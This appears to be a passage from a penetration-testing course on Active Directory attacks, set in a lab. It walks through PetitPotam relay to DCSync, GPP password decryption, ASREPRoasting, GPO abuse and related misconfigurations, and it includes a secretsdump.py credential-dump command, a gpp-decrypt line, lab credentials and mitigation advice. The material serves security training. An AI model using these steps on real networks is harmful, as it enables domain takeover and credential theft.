Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

![](../../../ZMEDIA/Pasted%20image%2020260707112206.png)
![](../../../ZMEDIA/Pasted%20image%2020260707112228.png)
#### Requesting a TGT Using gettgtpkinit.py

Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

![](../../../ZMEDIA/Pasted%20image%2020260707112245.png)

#### Setting the KRB5CCNAME Environment Variable

The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

```shellsession
haphestus@htb[/htb]$ export KRB5CCNAME=dc01.ccache
```

#### Using Domain Controller TGT to DCSync

We can then use this TGT with `secretsdump.py` to perform a DCSync and retrieve one or all of the NTLM password hashes for the domain.

![](../../../ZMEDIA/Pasted%20image%2020260707112313.png)

We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file. We can see this by typing `klist` (using the `klist` command requires installation of the [krb5-user](https://packages.ubuntu.com/focal/krb5-user) package on our attack host. This is installed on ATTACK01 in the lab already).

#### Running klist

![](../../../ZMEDIA/Pasted%20image%2020260707112325.png)

#### Confirming Admin Access to the Domain Controller

Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.

![](../../../ZMEDIA/Pasted%20image%2020260707112337.png)

#### Submitting a TGS Request for Ourselves Using getnthash.py

We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

![](../../../ZMEDIA/Pasted%20image%2020260707112349.png)

We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.

#### Using Domain Controller NTLM Hash to DCSync

![](../../../ZMEDIA/Pasted%20image%2020260707112413.png)

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

Note: We would need to use the `MS01` attack host in another section, such as the `ACL Abuse Tactics` or `Privileged Access` section once we have the base64 certificate saved down to our notes to perform this using Rubeus.

#### Requesting TGT and Performing PTT with DC01$ Machine Account

 ![](../../../ZMEDIA/Pasted%20image%2020260707112440.png)
![](../../../ZMEDIA/Pasted%20image%2020260707112453.png)

We can then type `klist` to confirm that the ticket is in memory.

#### Confirming the Ticket is in Memory

 ![](../../../ZMEDIA/Pasted%20image%2020260707112523.png)

Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.

#### Performing DCSync with Mimikatz

![](../../../ZMEDIA/Pasted%20image%2020260707112537.png)

---

## PetitPotam Mitigations

First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:

- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.

---

## Recap

In this section we covered three recent attacks:

- NoPac (SamAccountName Spoofing)
- PrintNightmare (remotely)
- PetitPotam (MS-EFSRPC)

Each of these attacks can be performed with either standard domain user access (NoPac and PrintNightmare) or without any type of authentication to the domain at all (PetitPotam), and can lead to domain compromise relatively easily. There are multiple ways to perform each attack, and we covered a few. Active Directory attacks continue to evolve, and these are surely not the last extremely high-impact attack vectors that we will see. When these types of attacks are released, we should strive to build a small lab environment to practice them in, so we are ready to use them safely and effectively in a real-world engagement should the opportunity arise. Understanding how to set up these attacks in a lab can also significantly increase our understanding of the issue and help us to better advise our clients on the impact, remediation, and detections. This was just a tiny glimpse into the world of attacking AD CS, which could be an entire module.

In the next section, we'll talk through various other issues that we see from time to time in Active Directory environments that could help us further our access or lead to additional findings for our final client report.

# Miscellaneous Misconfigurations

---

There are many other attacks and interesting misconfigurations that we may come across during an assessment. A broad understanding of the ins and outs of AD will help us think outside the box and discover issues that others are likely to miss.

---

## Scenario Setup

In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portions of this section that require interaction from a Linux host, you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`.

---

## Exchange Related Group Membership

A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.

The Exchange group `Organization Management` is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`.

#### Viewing Organization Management's Permissions

![Advanced Security Settings for Organization Management showing permissions for Exchange Trusted Subsystem.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/org_mgmt_perms.png)

If we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.

---

## PrivExchange

The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

---

## Printer Bug

The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, and force the server to authenticate to any host provided by the client over SMB.

The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.

The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.

We can leverage the `Get-SpoolStatus` function from `SecurityAssessment.ps1` (available on the target system) as preserved in [this](https://github.com/itzvenom/Security-Assessment-PS) repository or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check for machines vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.

#### Enumerating for MS-PRN Printer Bug

![](../../../ZMEDIA/Pasted%20image%2020260707112656.png)

---

## MS14-068

This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine [Mantis](https://app.hackthebox.com/machines/98) on the Hack The Box platform showcases this vulnerability.

---

## Sniffing LDAP Credentials

Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).

---

## Enumerating DNS Records

We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as `BloodHound` is similar to `SRV01934.INLANEFREIGHT.LOCAL`. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as `JENKINS.INLANEFREIGHT.LOCAL`, which we can use to better plan out our attacks.

The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

On the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.

#### Using adidnsdump

![](../../../ZMEDIA/Pasted%20image%2020260707112711.png)

#### Viewing the Contents of the records.csv File

![](../../../ZMEDIA/Pasted%20image%2020260707112721.png)

If we run again with the `-r` flag the tool will attempt to resolve unknown records by performing an `A` query. Now we can see that an IP address of `172.16.5.240` showed up for LOGISTICS. While this is a small example, it is worth running this tool in larger environments. We may uncover "hidden" records that can lead to discovering interesting hosts.

#### Using the -r Option to Resolve Unknown Records

 ![](../../../ZMEDIA/Pasted%20image%2020260707112732.png)

#### Finding Hidden Records in the records.csv File

![](../../../ZMEDIA/Pasted%20image%2020260707112744.png)

---

## Other Misconfigurations

There are many other misconfigurations that can be used to further your access within a domain.

---

### Password in Description Field

Sensitive information such as account passwords are sometimes found in the user account `Description` or `Notes` fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.

#### Finding Passwords in the Description Field using Get-Domain User

![](../../../ZMEDIA/Pasted%20image%2020260707112758.png)

---

## PASSWD_NOTREQD Field

It is possible to come across domain accounts with the [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.

#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
![](../../../ZMEDIA/Pasted%20image%2020260707112810.png)

---

## Credentials in SMB Shares and SYSVOL Scripts

The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named `reset_local_admin_pass.vbs`.

#### Discovering an Interesting Script

![](../../../ZMEDIA/Pasted%20image%2020260707112822.png)

Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the `--local-auth` flag as shown in this module's `Internal Password Spraying - from Linux` section.

#### Finding a Password in the Script

![](../../../ZMEDIA/Pasted%20image%2020260707112834.png)

---

## Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.

The XML looks like the following:

#### Viewing Groups.xml

![XML code showing user properties for Administrator with account not disabled and password never expires.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/GPP.png)

If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:

#### Decrypting the Password with gpp-decrypt

```shellsession
haphestus@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE Password1
```

GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.

#### Locating & Retrieving GPP Passwords with CrackMapExec

![](../../../ZMEDIA/Pasted%20image%2020260707112903.png)

It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain. We can hunt for this using CrackMapExec with the [gpp_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or using the [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.

#### Using CrackMapExec's gpp_autologin Module

![](../../../ZMEDIA/Pasted%20image%2020260707112917.png)

In the output above, we can see that we have retrieved the credentials for an account called `guarddesk`. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where we can log in as an admin and hunt for additional data. Sometimes we may discover credentials for a highly privileged user or credentials for a disabled account/an expired password that is no use to us.

A theme that we touch on throughout this module is password re-use. Poor password hygiene is common in many organizations, so whenever we obtain credentials, we should check to see if we can use them to access other hosts (as a domain or local user), leverage any rights such as interesting ACLs, access shares, or use the password in a password spraying attack to uncover password re-use and maybe an account that grants us further access towards our goal.

---

## ASREPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.

#### Viewing an Account with the Do not Require Kerberos Preauthentication Option

![Active Directory Users and Computers showing Matthew Morgan's account properties with Kerberos encryption options.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/preauth_not_reqd_mmorgan.png)

ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.

The attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the ticket for the target account. If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser

![](../../../ZMEDIA/Pasted%20image%2020260707112937.png)

With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the `/nowrap` flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.

#### Retrieving AS-REP in Proper Format using Rubeus

![](../../../ZMEDIA/Pasted%20image%2020260707112951.png)

We can then crack the hash offline using Hashcat with mode `18200`.

#### Cracking the Hash Offline with Hashcat

 ![](../../../ZMEDIA/Pasted%20image%2020260707113006.png)
When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.

#### Retrieving the AS-REP Using Kerbrute

 ![](../../../ZMEDIA/Pasted%20image%2020260707113024.png)

With a list of valid users, we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as `jsmith.txt` into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.

#### Hunting for Users with Kerberos Pre-auth Not Required

![](../../../ZMEDIA/Pasted%20image%2020260707113123.png)

We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.

---

## Group Policy Object (GPO) Abuse

Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, domain compromise, and even as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.

GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.

Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO/) function from PowerView, we can get a listing of GPOs by name.

#### Enumerating GPO Names with PowerView

![](../../../ZMEDIA/Pasted%20image%2020260707113108.png)

This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) such as `Get-GPO` to perform the same enumeration.

#### Enumerating GPO Names with a Built-In Cmdlet

![](../../../ZMEDIA/Pasted%20image%2020260707113145.png)

Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.

#### Enumerating Domain User GPO Rights

![](../../../ZMEDIA/Pasted%20image%2020260707113158.png)

Here we can see that the Domain Users group has various permissions over a GPO, such as `WriteProperty` and `WriteDacl`, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with `Get-GPO` to see the display name of the GPO.

#### Converting GPO GUID to Name

![](../../../ZMEDIA/Pasted%20image%2020260707113208.png)

Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.

![Graph showing DOMAIN USERS@INLANEFREIGHT.LOCAL with GenericWrite, WriteOwner, and WriteDacl permissions to DISCONNECT IDLE RDP@INLANEFREIGHT.LOCAL.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/gporights.png)

If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.

![Graph showing GpLink from DISCONNECT IDLE RDP@INLANEFREIGHT.LOCAL to APPLICATION@INLANEFREIGHT.LOCAL, which contains multiple ACADEMY-EA-APP nodes.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/gpoaffected.png)

We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host. The hosts shown in the above image are not exploitable, and GPO attacks will be covered in-depth in a later module.

---

## Onwards

We have seen various misconfigurations that we may run into during an assessment, and there are many more that will be covered in more advanced Active Directory modules. It is worth familiarizing ourselves with as many attacks as possible, so we recommend doing some research on topics such as:

- Active Directory Certificate Services (AD CS) attacks
- Kerberos Constrained Delegation
- Kerberos Unconstrained Delegation
- Kerberos Resource-Based Constrained Delegation (RBCD)

In the following few sections, we will briefly cover attacking AD trusts. This is a vast and complicated topic that will be covered in-depth in a later module.